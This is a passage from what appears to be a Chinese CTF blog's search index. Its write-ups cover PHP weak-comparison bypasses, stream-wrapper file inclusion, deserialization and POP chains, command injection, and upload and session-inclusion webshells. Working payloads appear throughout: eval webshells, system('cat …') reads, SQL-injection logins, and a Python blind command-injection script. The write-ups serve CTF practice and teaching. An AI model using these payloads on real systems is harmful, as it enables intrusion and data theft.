要求输入两个md5值一样,但是字符串不一样的值,但是因为他比较使用的是==,所以可以通过md5值为0e开头的字符串绕过,因为php在处理==的时候当碰到的字符串有一边为0e开头的就把这串字符串认为是科学计数法,所以就是0,所以可以通过另一个md5值也是0e开头的字符串进行绕过.payload ?a=s878926199a s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a 4.3、还是数组绕过 &lt;?phphighlight_file(&apos;flag.php&apos;);$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);$flag = &apos;flag{xxxxxxxxxxxxxxxxxx}&apos;;if (isset($_GET[&apos;uname&apos;]) and isset($_GET[&apos;passwd&apos;])) { if ($_GET[&apos;uname&apos;] == $_GET[&apos;passwd&apos;]) print &apos;passwd can not be uname.&apos;; else if (sha1($_GET[&apos;uname&apos;]) === sha1($_GET[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) die(&apos;Flag: &apos;.$flag); else print &apos;sorry!&apos;;}?&gt; payload /?uname[]=1&amp;id=margin&amp;passwd[]=2 4.4、弱类型整数大小比较绕过$temp = $_GET[&apos;password&apos;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336){echo $flag; payload?password[]=1 4.5、数组返回NULL绕过&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&apos;password&apos;])) {if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)echo &apos;You password must be alphanumeric&apos;;else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)die(&apos;Flag: &apos; . $flag);elseecho &apos;Invalid password&apos;;}?&gt; payload?password[]=1 4.6、strpos数组绕过&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&apos;ctf&apos;])) {if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)echo &apos;必须输入数字才行&apos;;else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)die(&apos;Flag: &apos;.$flag);elseecho &apos;骚年，继续努力吧啊~&apos;;}?&gt; payload?ctf[]=1 4.7、00截断正则/也可以数组绕过if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) { echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; } else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) { if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) { die(&apos;Flag: &apos; . $flag); } else { echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); } } else { echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; }} payload 1-利用数组绕过这两个函数?password[]=12-%00截断绕过正则匹配?password=1e9%00*-* 4.7、is_number[极客大挑战 2019]BuyFlag if (isset($_POST[&apos;password&apos;])) { $password = $_POST[&apos;password&apos;]; if (is_numeric($password)) { echo &quot;password can&apos;t be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; }} payloadpassword=404 (后面加一个空格) tps:%00文件包含是否支持%00截断取决于：PHP版本&lt;=5.2 可以使用%00进行截断。","link":"2019/12/03/php%E4%B8%AD%E7%A5%9E%E7%A7%98%E7%9A%84md5/"},{"title":"php伪协议","text":"php支持的伪协议php:// — 访问各个输入/输出流（I/O streams）file:// — 访问本地文件系统phar:// — PHP 归档zlib:// — 压缩流data:// — 数据（RFC 2397）http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsglob:// — 查找匹配的文件路径模式ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 环境支持PHP.ini： allow_url_fopen ：on 默认开启 该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。allow_url_include：off 默认关闭，该选项为on便是允许 包含URL 对象文件等。 1.php://协议php://filterphp://input php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取源代码并进行base64编码输出。payload如下： php://filter/read=convert.base64-encode/resource=upload.php php://input：访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的。 2.file://协议file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。例子一，例子二使用方法： file:// [文件的绝对路径和文件名]file:///etc/passwd 3.phar://协议phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。例子一 nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.php 4.zlib://协议zip://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：file.php?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]file.php?file=zip://nac.jpg#nac.php 其中get请求中#需要进行编码，即%23 bzip2://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下： file.php?file=compress.bzip2://nac.bz2file.php?file=compress.bzip2://./nac.jpgfile.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg zlib://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下： file.php?file=compress.zlib://file.gzfile.php?file=compress.zlib://./nac.jpgfile.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg 5.data://协议data://：需满足allow_url_fopen，allow_url_include同时开启才能使用，使用如下： file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=file.php?file=data:text/plain,&lt;?php phpinfo()?&gt;file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 6.phar和ziphttps://kit4y.github.io/2020/01/04/phar-de-li-yong-zi-shi/ 参考https://www.freebuf.com/column/148886.html","link":"2019/12/03/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"title":"php反序列化漏洞","text":"一、反序列化漏洞serialize()，unserialize()这两个函数说一说序列化和反序列化的，序列化说通俗点就是把一个对象变成可以传输的字符串。比如一个类class,在内存中是一个类，但是要持久化或者进行传输，就需要序列化，意思其实就是把类存储起来而已。 demo1:类的序列化 &lt;?phpclass Car{ var $size; var $color; function Car($size=&quot;big&quot;){ $this-&gt;size=$size; } function what_size(){ return $this-&gt;size; }}$mycar=new Car();$mycar-&gt;color=&quot;green&quot;; echo var_dump($mycar);echo &quot;&lt;br&gt;&quot;;echo serialize($mycar);?&gt; 输出 object(Car)#1 (2) { [&quot;size&quot;]=&gt; string(3) &quot;big&quot; [&quot;color&quot;]=&gt; string(5) &quot;green&quot; }O:3:&quot;Car&quot;:2:{s:4:&quot;size&quot;;s:3:&quot;big&quot;;s:5:&quot;color&quot;;s:5:&quot;green&quot;;} 其实我觉得序列化和var_dump功能类似吧，反正就是不能有，反序列化即把字符串O:3:&quot;Car&quot;:2:{s:4:&quot;size&quot;;s:3:&quot;big&quot;;s:5:&quot;color&quot;;s:5:&quot;green&quot;;}转为类，但是如果是类，需要先定义类 demo2:类的反序列化&lt;?php#类反序列化class kitty{ var $age; function Car($age=&quot;18&quot;){ $this-&gt;size=$size; }}$seriStr=&apos;O:5:&quot;kitty&quot;:1:{s:3:&quot;age&quot;;s:2:&quot;18&quot;;}&apos;;$new_me=unserialize($seriStr);echo &quot;&lt;br&gt;&quot;;echo var_dump($new_me);echo &quot;&lt;br&gt;&quot;;echo $new_me-&gt;age;echo &quot;&lt;br&gt;&quot;;?&gt; 输出 object(kitty)#2 (1) { [&quot;age&quot;]=&gt; string(2) &quot;18&quot; }18 demo3:数组的序列化和反序列化&lt;?php#数组序列化$data=[&apos;php&apos;,&apos;java&apos;,123];echo &quot;&lt;br&gt;&quot;;echo serialize($data);#数组反序列化$new_ar=&apos;a:3:{i:0;s:5:&quot;kitty&quot;;i:1;s:4:&quot;java&quot;;i:2;s:6:&quot;python&quot;;}&apos;;echo &quot;&lt;br&gt;&quot;;echo var_dump(unserialize($new_ar));echo &quot;&lt;br&gt;&quot;;echo unserialize($new_ar)[0];?&gt; 输出 a:3:{i:0;s:3:&quot;php&quot;;i:1;s:4:&quot;java&quot;;i:2;i:123;}array(3) { [0]=&gt; string(5) &quot;kitty&quot; [1]=&gt; string(4) &quot;java&quot; [2]=&gt; string(6) &quot;python&quot; }kitty 语法规则 二、反序列化漏洞产生其实还是一个变量覆盖的问题吧，我们传入的字符串反序列化，导致控制参数或者任意代码执行 代码执行&lt;?phpclass Example { var $var = &quot;&quot;; function __destruct() { eval($this-&gt;var); }}unserialize($_GET[&quot;saved_code&quot;]);?&gt; payloadhttp://localhost/ser.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo();%22;} jarvios例题：源码泄露给了两个文件index.php &lt;?php require_once(&apos;shield.php&apos;); $x = new Shield(); isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;]; if (!empty($g)) { $x = unserialize($g); } echo $x-&gt;readfile();?&gt; shield.php &lt;?php//flag is in pctf.phpclass Shield { public $file; function __construct($filename = &apos;&apos;) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); } }}?&gt; 这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作payloadO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;} “百度杯”CTF比赛 十月场 Hash&lt;?phpclass Demo { private $file = &apos;Gu3ss_m3_h2h2.php&apos;; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != &apos;Gu3ss_m3_h2h2.php&apos;) { //the secret is in the f15g_1s_here.php $this-&gt;file = &apos;Gu3ss_m3_h2h2.php&apos;; } }}if (isset($_GET[&apos;var&apos;])) { $var = base64_decode($_GET[&apos;var&apos;]); if (preg_match(&apos;/[oc]:\\d+:/i&apos;, $var)) { die(&apos;stop hacking!&apos;); } else { @unserialize($var); }} else { highlight_file(&quot;Gu3ss_m3_h2h2.php&quot;);}?&gt; payload &lt;?phpclass Demo { private $file = &apos;Gu3ss_m3_h2h2.php&apos;; public function __construct($file) { $this-&gt;file = $file; }}$a = new Demo(&apos;f15g_1s_here.php&apos;);$s = serialize($a);echo $s;echo &quot;\\n&quot;;$s = str_replace(&apos;O:4&apos;, &apos;O:+4&apos;,$s);//绕过正则$s = str_replace(&apos;:1:&apos;, &apos;:2:&apos; ,$s);//绕过wakeup函数echo $s;echo &quot;\\n&quot;;echo base64_encode($s);//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==","link":"2019/07/20/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"PHP命令注入","text":"命令注入额 没啥，类似于一句话木马的官方话吧常见php命令注入函数eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。 &lt;?php $myvar = &quot;varname&quot;; $x = $_GET[&apos;arg&apos;]; eval(&quot;\\$myvar = $x;&quot;);?&gt; poc/index.php?arg=1;phpinfo() 专门聊一下create_function命令注入核心 如果可控在第一个参数，需要闭合圆括号和大括号：create_function(&apos;){}phpinfo();//&apos;, &apos;&apos;);如果可控在第二个参数，需要闭合大括号：create_function(&apos;&apos;, &apos;}phpinfo();//&apos;); create_function参数注入&lt;?phpshow_source(__FILE__);$act = @$_GET[&apos;act&apos;];$arg = @$_GET[&apos;arg&apos;];if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;,$act)) { echo &apos;check&apos;;} else { $act($arg,&apos;&apos;);}echo &apos;666&apos;; poc ?act=\\create_function&amp;arg=){}system(&apos;cat /ffflll4g&apos;);// ps：2020/5/30 校赛 ：发现用其他函数可以直接执行，支持两个参数的，比如readfile,highlight_file create_function内容注入&lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) { show_source(__FILE__);} else { $action(&apos;&apos;, $arg);} poc ?action=\\create_function&amp;arg=return 2333;}phpinfo();// jarvios的babyphp：jarvios的babyphp可以目录扫描一下，有.git文件夹泄露通过githack还原源码审计发现下面漏洞 $file = &quot;templates/&quot; . $page . &quot;.php&quot;;assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;); 首先加上前缀后缀，第二行规则不允许出现两个点，.php已经出现了一个点，所以page参数允许出现点，第二行strpos(xxx,zzz)在xxx中寻找zzz，如果成功返回字符位置，如果没有则返回false就可以注入了比如执行phpinfo();我们传入page=&apos;) or phpinfo();#,如此$file=templates/&apos;) or phpinfo();#.php,为了讲解我没转义，大家需要自己先urldecode然后下面变成 assert(&quot;strpos(&apos;templates/&apos;) or phpinfo();#.php&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);assert(&quot;file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;); 我觉得不行啊，#后面注释后句子变成 assert(&quot;file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;); 都没闭合这谁顶得住的，我自己构造page=&apos;) or phpinfo();&quot;)#,缺报错了，黑人问号jpg,我觉得应该是我有语法错误了 ！！！以上理解是错误的！！从这句分析 assert(&quot;strpos(&apos;templates/&apos;) or phpinfo();#.php&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); 其实其中的#号没有将后面的注释只是将语句注释了，所以同义为 assert(&quot;strpos(&apos;templates/&apos;) or phpinfo();&quot;) or die(&quot;Detected hacking attempt!&quot;); 2333 awsl-所以遇到问题本地多测试一下很重要-ε=ε=ε=┏(゜ロ゜;)┛ 然后就可以为所欲为 page=&apos;) or print_r(file_get_contents(&apos;templates/flag.php&apos;));#转码page=&apos;)%20or%20print_r(file_get_contents(&apos;templates%2fflag.php&apos;))%3b%23 另外一种构造 page=&apos;.system(&quot;{PHPCODE}&quot;).&apos; 比如 page=&apos;.system(&quot;ls&quot;).&apos;page=&apos;.system(&quot;cat templates/flag.php;&quot;).&apos; ps:system 函数是不需要输出的，只要执行了就会输出来,其实发现注入第二个也是可以的-php真玄学 神塔么shell注入一个题先绕过 $sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;; if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password)){ } payload username=admin&apos; union select 1,md5(1)%23password=1 然后出现一个shell注入，命令远程会执行，但是没有回显，只有那个一个进程的，盲猜应该是ps -aux | grep {命令}方法1当然可以直接反弹shell远程，还有一个方法就是shell注入,需要修改一下PHPSESSID注入语句 c=123;a=`ls`;b=&apos;a&apos;;if [ ${a:0:1} == $b ];then sleep 2;fi import requestsurl = &apos;http://123.206.31.85:49165/index.php&apos;s = requests.session()allString = &apos;&apos;&apos;1234567890~`!@#$%^&amp;*()-_=+[]{};:&apos;&quot;|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;&apos;&apos; database = &apos;&apos;flag = 1comm =input(&apos;输入指令：&apos;)headers = {&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Referer&apos;:&apos;http://123.206.31.85:49165/index.php&apos;,}cookies = dict(PHPSESSID=&apos;d637ecrlrp3ae9jgqqunu97f22&apos;)for i in range(0,100):#根据自身需要改长度，如果空格连续出现四次以上，就说明后续没内容了 for j in allString: #header = { #&quot;X-Forwarded-For&quot;:&quot;1&apos;+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#&quot;%(i,ord(j)) #} #print(j) if j == &quot;^&quot;: #print(&apos;此处有空格&apos;) j = &quot; &quot; data={&apos;c&apos;:&quot;123;a=`&quot;+comm+&quot;`;b=&apos; &apos;;if [ ${a:&quot;+str(i)+&quot;:1} == $b ];then sleep 4;fi&quot;} else: data={&apos;c&apos;:&quot;123;a=`&quot;+comm+&quot;`;b=\\&apos;&quot;+str(j)+&quot;\\&apos;;if [ ${a:&quot;+str(i)+&quot;:1} == $b ];then sleep 4;fi&quot;} r = requests.post(url,data=data,headers=headers,cookies=cookies) t = r.elapsed.total_seconds() #print(r.text) print(database+&apos; &apos;+&apos;the time of &apos;+j+&apos; is &apos;+str(t)) if t &gt;= 4: database = database + j print(&apos;the &apos;+str(i)+&apos; place of database is &apos;+j) break elif t &lt; 4 and j == &apos;M&apos;: flag = 0 break if flag == 0 : breakprint(&apos;&apos;,database) 二、love_mathhttps://github.com/glzjin/ciscn_2019_qual_love_mathhttp://2fc3da22-d2ec-46f7-8f37-7c134998c844.node3.buuoj.cn/?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211243818))) “百度杯”CTF比赛 十月场 hash通过别的途径获得源码 得到 &lt;?phpif (isset($_GET[&apos;val&apos;])) { $val = $_GET[&apos;val&apos;]; eval(&apos;$value=&quot;&apos; . addslashes($val) . &apos;&quot;;&apos;);} else { die(&apos;hahaha!&apos;);}?&gt; 首先 addslashes() 函数在每个双引号（”）前添加反斜杠： &lt;?php $str = addslashes(&apos;Shanghai is the &quot;biggest&quot; city in China.&apos;);echo($str); ?&gt; 输出Shanghai is the \\&quot;biggest\\&quot; city in China. poc ?val=${eval($_GET[a])}&amp;a=echo `ls`;?val=${eval($_GET[a])}&amp;a=echo `cat True_F1ag_i3_Here_233.php| base64`;``` ### X-Forwarded-For可选地址 192.168.0.0172.16.0.010.0.0.0127.0.0.0localhost `X-Forwarded-For对应$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]`","link":"2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"},{"title":"php文件上传","text":"“百度杯”CTF比赛 2017 九月场-upload题目描述 想怎么传就怎么传，就是这么任性。tips:flag在flag.php中 过滤了&lt;? 和php使用&lt;script language=&apos;PhP&apos;&gt;@eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;读取flag即可，有时候system函数无回显可以加上base64cmd=system(&quot;cat ../flag.php | base64&quot;);然后解码即可 第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload？首先文件上传，抓包改后缀即可，然后发现没有flag!!!但是读取config.php的时候 &lt;?phperror_reporting(0);session_start();$servername = &quot;localhost&quot;;$username = &quot;ctf&quot;;$password = &quot;ctfctfctf&quot;;$database = &quot;ctf&quot;;// 创建连接$conn = mysql_connect($servername,$username,$password) or die(&quot; connect to mysql error&quot;);mysql_select_db($database);?&gt; 然后通过蚁剑连接数据库，获得flag","link":"2019/12/03/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"php文件包含","text":"“百度杯”CTF比赛 2017 二月场-include可以使用php://filter/convert.base64-encode/resource=index.php读取任意文件但是没啥用，不知道flag文件的名字所以使用http://ace46edd1c9f412eb50fa9cd198420223e7b80edf0ee4d9c.changame.ichunqiu.com/?path=php://inputpost&lt;?php system(&quot;ls&quot;);?&gt;读取目录&lt;?php system(&quot;cat dle345aae.php | base64&quot;);?&gt;读取到flag 百度杯十二月–看看我的Notebook-session文件包含之后在robots.txt发现php1nFo.php文件http://ceb4e4f921b2444eaeb20d272f7a9cef79afe475f5c7447f.game.ichunqiu.com/action.php?module=php&amp;file=php1nFo发现poc注册用户 &lt;?php @eval($_POST[cmd]);?&gt; 登录然后查看自己的session PHPSESSID:e12gf61f8dqd0vfpg4ssntdpc7 然后访问 http://cd674daadfa14fda832ca1e08c3ad0853810ea5951d34a15.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_e12gf61f8dqd0vfpg4ssntdpc7 2020四叶草的一个session包含首先给了2个点，一个是phpinfo，一个是lfi，但是没开远程包含，读取包含都看了一遍没有flag这样读 /index.php?action=php://filter/read=convert.base64-encode/resource=login.php 登录的源码是这样的 &lt;?phpsession_start();error_reporting(0);header(&quot;Content-Type: text/html; charset=UTF-8&quot;);require_once &apos;config.php&apos;;if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])){ $username = $_POST[&apos;username&apos;]; $password = md5($_POST[&apos;password&apos;]); if($con-&gt;connect_error){ die(&quot;db connect error&quot;); } $sql = &quot;select * from users where username=&apos;&quot;.$username.&quot;&apos; and password=&apos;&quot;.$password.&quot;&apos;&quot;; $query = $con-&gt;query($sql); $row = $query-&gt;fetch_array(); if(!empty($row)){ echo $row[&apos;name&apos;]; $_SESSION[&apos;username&apos;] = base64_encode($row[0]); header(&apos;Location: index.php&apos;); die(); }else{ die(&apos;&lt;br&gt;login error&apos;); } }?&gt; 首先我们发现有一个sql注入，登录的时候，session中会留下用户名的base64加密 username|s:8:&quot;YWRtaW4=&quot;; 后面是用户的base64想了很久可以包含session，但是这个base64加密后绕不过去后来发现可以再用base64-decode一次绕过-但是还有个问题就是前面的username|s:8:&quot;和后面的会不会影响经过实验发现如果这个base64字符串足够长是可以忽略前面的，payload：用户名为 000&apos; union select &apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php eval(\\$_POST[\\&apos;cmd\\&apos;])?&gt;&apos;,3 # 密码随意session包含得到/index.php?action=/var/lib/php5/sess_3mck4o350rb2085cunu2mnajk6 username|s:120:&quot;YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKT8+&quot;; 再用一层解密/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_3mck4o350rb2085cunu2mnajk6事实证明是可以的，但是用户名前面就是要加很多pad，原因有待进一步考察 NPUCTF_easyphp这是一个无数据库的留言 &lt;?php header(&apos;content-type:application/json&apos;);session_start();function safe($msg) { if (strlen($msg)&gt;17) { return &quot;msg is too loooong!&quot;; } else { return preg_replace(&quot;/php/&quot;,&quot;?&quot;,$msg); }}if (!isset($_SESSION[&apos;msg&apos;])&amp;empty($_SESSION[&apos;msg&apos;]))$_SESSION[&apos;msg&apos;] = array();if (isset($_POST[&apos;msg&apos;])) { array_push($_SESSION[&apos;msg&apos;], [&apos;msg&apos;=&gt;safe($_POST[&apos;msg&apos;]),&apos;time&apos;=&gt;date(&apos;Y-m-d H:i:s&apos;,time())]); echo json_encode(array([&apos;msg&apos;=&gt;safe($_POST[&apos;msg&apos;]),&apos;time&apos;=&gt;date(&apos;Y-m-d H:i:s&apos;,time())])); exit();}if(!empty($_SESSION[&apos;msg&apos;])) { echo json_encode($_SESSION[&apos;msg&apos;]);} else { echo &quot;?????????????????€???&quot;;}?&gt; 大概就是把你要存的msg丢在session中，但是有2个限制，一个是17长度，一个是他是数组形式，也ban了php官方怕payload &lt;?=$a=$_GET;/**/$a[1]($a[2]);?&gt; 当时我做的时候的paylod,其实差不多了 &lt;?Php /* */$a=$_GET;/* */extract($a);/* */eval($b);?&gt;","link":"2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"title":"萌新入门pop链","text":"一、POP?ROP?面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。 ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。 二、初级利用一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。举例demo.php &lt;?phpclass lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new normal(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); }}class normal { function action() { echo &quot;hello&quot;; }}class evil { private $data; function action() { eval($this-&gt;data); }}unserialize($_GET[&apos;d&apos;]); crack.php &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new evil(); }}class evil { private $data=&quot;phpinfo();&quot;;}$a=new lemon();echo urlencode(serialize($a));?&gt; protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。 三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数先解释几个魔法函数__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 更多参考https://www.php.net/manual/zh/language.oop5.magic.php 1. __call()PHP5 的对象新增了一个专用方法 __call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。demo &lt;?php class A { private function a() { echo &quot;a&quot;; } public function __call($name,$arguments) { echo &quot;调用不存在的方法名是:&quot;.$name.&apos;&lt;br&gt;参数是:&apos;; print_r($arguments); echo &apos;&lt;br&gt;&apos;; } $ins=new A; $ins-&gt;b([1,2,3]);?&gt;//输出结果为 调用不存在的方法名是：b 参数是：Array ( [0] =&gt; Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 ) ) 2. __invoke()当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。本特性只在 PHP 5.3.0 及以上版本有效 &lt;?phpclass CallableClass { function __invoke($x) { var_dump($x); }}$obj = new CallableClass;$obj(5);var_dump(is_callable($obj));?&gt; 输出 int(5)bool(true) 3.__toString__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 &lt;?php// Declare a simple classclass TestClass{ public $foo; public function __construct($foo) { $this-&gt;foo = $foo; } public function __toString() { return $this-&gt;foo; }}$class = new TestClass(&apos;Hello&apos;);echo $class;?&gt;//输出 Hello 需要指出的是在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 echo 或 print 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。 4.__wakeup()__wakeup()是在反序列化操作中起作用的魔法函数，当unserialize的时候，会检查时候存在__wakeup()函数，如果存在的话，会优先调用__wakeup()函数。 &lt;?php class xctf{ public $flag = &apos;111&apos;; public function __wakeup(){ print(&quot;this is __wakeup()&quot;); }} $test = new xctf();$t = serialize($test);unserialize($t); ?&gt;//输出this is __wakeup() ps: __wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么i就调用__wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。 class xctf{public $flag = &apos;111&apos;;public function __wakeup(){exit(&apos;bad requests&apos;);}//这里差个反括号，但是源码确实是这样的。?code= 将上面的要求序列化后为O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，xctf后有一个数字1，这个1是代表这个类有一个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。如，我们提交O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，将其改为2，得到flag。 5.__construct(),__destruct()同c++的构造函数和析构函数 6.__clone()克隆对象时被调用。如：$t=new 